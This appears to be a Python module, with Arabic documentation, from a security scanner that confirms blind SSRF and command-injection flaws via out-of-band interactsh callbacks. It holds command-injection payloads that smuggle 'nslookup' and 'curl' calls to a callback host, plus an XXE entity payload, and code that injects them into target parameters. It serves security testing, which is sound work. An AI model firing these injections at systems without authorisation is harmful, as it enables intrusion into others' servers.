"""تأكيد الثغرات العمياء (blind) عبر تحقّق خارج النطاق OOB — نقي وقابل للاختبار.

الثغرات العمياء (blind SSRF/RCE، XXE، blind SQLi عبر OOB) لا تترك أثرًا في الرد
ولا إشارة زمنية موثوقة. الدليل الوحيد: callback على خادم interactsh تتحكّم به.

يُحقَن عميل OOB (OobClient) ومُرسِل الطلب (probe) حتى يُختبَر بلا شبكة. يتكامل مع
confirmers عبر Verdict نفسه.
"""

from __future__ import annotations

import time
from collections.abc import Callable
from dataclasses import dataclass

from workers.confirmers import Verdict, inject
from workers.oob import OobClient, correlate


@dataclass
class OobPayloads:
    """حمولات حقن لكل نوع blind — {param_value} يُستبدل بـ URL/host الـ OOB."""

    # SSRF: قيمة المعامل = رابط OOB مباشرة.
    ssrf = "{url}"
    # RCE أعمى: أوامر تُخرِج DNS/HTTP نحو OOB (عدّة أشكال).
    rce = [";nslookup {host}", "|nslookup {host}", "&&curl {url}", "`curl {url}`", "$(curl {url})"]
    # XXE: كيان خارجي نحو OOB (يُرسَل في جسم XML).
    xxe = ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "{url}">]><r>&x;</r>')


def _poll_until(client: OobClient, expected: set[str], *, tries: int = 6,
                sleep: Callable[[float], None] = time.sleep, delay: float = 2.0) -> set[str]:
    """يستطلع interactsh عدة مرات (الـ callback قد يتأخّر) ويرجّع المعرّفات التي وصلت."""
    hits: set[str] = set()
    for i in range(tries):
        try:
            interactions = client.poll()
        except Exception:
            interactions = []
        hits |= correlate(expected, interactions)
        if hits == expected or hits:
            return hits
        if i < tries - 1:
            sleep(delay)
    return hits


def confirm_blind_ssrf(probe, client: OobClient, url: str, param: str, **kw) -> Verdict:
    """يحقن رابط OOB في المعامل؛ إن وصل callback => SSRF مؤكّد."""
    uid, host = client.new_payload()
    probe.get(inject(url, param, f"https://{host}/"))
    hits = _poll_until(client, {uid}, **kw)
    if hits:
        return Verdict("confirmed", f"callback OOB وصل ({uid}) — SSRF أعمى مؤكّد")
    return Verdict("unconfirmed", "لا callback OOB — لم يُؤكَّد")


def confirm_blind_rce(probe, client: OobClient, url: str, param: str, **kw) -> Verdict:
    """يحقن أوامر تُطلق DNS/HTTP نحو OOB؛ أي callback => RCE أعمى مؤكّد."""
    uid, host = client.new_payload()
    for tpl in OobPayloads.rce:
        probe.get(inject(url, param, tpl.format(host=host, url=f"https://{host}/")))
    hits = _poll_until(client, {uid}, **kw)
    if hits:
        return Verdict("confirmed", f"callback OOB بعد حقن أمر ({uid}) — RCE أعمى مؤكّد")
    return Verdict("unconfirmed", "لا callback OOB — لم يُؤكَّد")


# confirmer(probe, client, url, param) -> Verdict
OOB_REGISTRY: list[tuple[tuple[str, ...], Callable]] = [
    (("ssrf", "server-side request"), confirm_blind_ssrf),
    (("rce", "command inj", "remote code", "os command"), confirm_blind_rce),
]


def pick_oob_confirmer(vuln_type: str | None):
    vt = (vuln_type or "").lower()
    for keywords, fn in OOB_REGISTRY:
        if any(k in vt for k in keywords):
            return fn
    return None
